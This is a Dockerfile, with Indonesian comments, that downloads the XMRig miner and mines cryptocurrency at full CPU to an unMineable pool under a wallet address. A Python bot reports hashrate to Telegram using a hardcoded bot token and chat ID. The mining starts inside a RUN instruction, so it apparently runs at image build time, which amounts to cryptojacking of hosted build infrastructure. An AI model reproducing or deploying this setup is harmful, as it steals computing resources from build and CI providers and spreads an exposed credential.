FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

# Install wget, tar, dan python3 untuk bot Telegram
RUN apt-get update && \
    apt-get install -y wget tar ca-certificates python3 python3-requests && \
    wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && \
    tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz

# Buat script Python untuk Bot Telegram Monitoring
RUN cat << 'EOF' > /bot.py
import time
import requests
import threading

TOKEN = "9200373511:AAE7lDnzL7joTavno-9VeIR1316HRZZc7YE"
CHAT_ID = "8949644128"
WORKER_ID = open("/proc/sys/kernel/random/uuid").read()[:6]

def send_msg(text, chat_id=CHAT_ID):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"}, timeout=10)
    except Exception:
        pass

def get_stats():
    try:
        r = requests.get("http://127.0.0.1:4044/1/summary", timeout=5).json()
        hr = r.get("hashrate", {}).get("total", [0, 0, 0])
        res = r.get("results", {})
        uptime = r.get("uptime", 0)
        
        h10s = f"{hr[0]:.2f}" if hr[0] else "0.00"
        h60s = f"{hr[1]:.2f}" if hr[1] else "0.00"
        h15m = f"{hr[2]:.2f}" if hr[2] else "0.00"
        good = res.get("shares_good", 0)
        total = res.get("shares_total", 0)
        
        return (
            f"⚡ <b>XMRig Status [sal909-{WORKER_ID}]</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🚀 <b>Hashrate (10s):</b> <code>{h10s} H/s</code>\n"
            f"📊 <b>Hashrate (60s):</b> <code>{h60s} H/s</code>\n"
            f"📈 <b>Hashrate (15m):</b> <code>{h15m} H/s</code>\n"
            f"✅ <b>Shares:</b> <code>{good} / {total}</code>\n"
            f"⏱ <b>Uptime:</b> <code>{uptime // 60} menit {uptime % 60} detik</code>\n"
            f"🖥 <b>CPU:</b> <code>AMD EPYC-Genoa (16 vCPU)</code>"
        )
    except Exception:
        return f"⏳ <b>Worker [sal909-{WORKER_ID}]</b> sedang menyiapkan dataset RandomX..."

def auto_report():
    send_msg(f"🟢 <b>Worker Baru Menyala!</b>\nID: <code>sal909-{WORKER_ID}</code>\nCPU: 16 Threads EPYC-Genoa")
    time.sleep(45) # Tunggu dataset RandomX selesai dibuat
    while True:
        send_msg(get_stats())
        time.sleep(120) # Kirim laporan otomatis setiap 2 menit

def poll_commands():
    offset = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={offset}&timeout=20"
            res = requests.get(url, timeout=25).json()
            for u in res.get("result", []):
                offset = u["update_id"] + 1
                msg = u.get("message", {})
                text = msg.get("text", "")
                cid = msg.get("chat", {}).get("id")
                if text.startswith(("/start", "/cek", "/status", "/hashrate")) and cid:
                    send_msg(get_stats(), cid)
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    threading.Thread(target=auto_report, daemon=True).start()
    poll_commands()
EOF

# Jalankan Bot di background (&) dan jalankan XMRig dengan HTTP API di port 4044
RUN WORKER_ID=$(cut -c1-6 /proc/sys/kernel/random/uuid) && \
    python3 /bot.py & \
    cd xmrig-6.22.2 && \
    ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 \
    -u USDT:0x098f58db447351f5433006b7761b9da8d8a26680.sal909-$WORKER_ID \
    -p x --tls --threads=16 --cpu-no-yield --randomx-no-numa \
    --http-host=127.0.0.1 --http-port=4044
